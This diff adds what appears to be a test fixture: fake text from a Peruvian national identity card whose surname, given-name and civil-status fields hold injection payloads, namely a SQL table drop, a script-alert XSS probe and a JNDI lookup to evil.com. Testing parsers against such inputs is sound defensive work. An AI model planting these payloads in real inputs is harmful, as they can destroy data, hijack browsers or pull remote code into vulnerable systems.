@@ -1,0 +1,18 @@
+REPÚBLICA DEL PERÚ
+DOCUMENTO NACIONAL DE IDENTIDAD
+CUI
+99999999-9
+Apellidos
+'; DROP TABLE users; --
+Prenombres
+<script>alert(1)</script>
+Sexo Nacionalidad Fecha de nacimiento
+M PER 01 01 2000
+Estado civil
+${jndi:ldap://evil.com}
+Fecha de caducidad
+01 01 2030
+Fecha de emisión
+01 01 2024
+Nro. de tarjeta
+0299999999
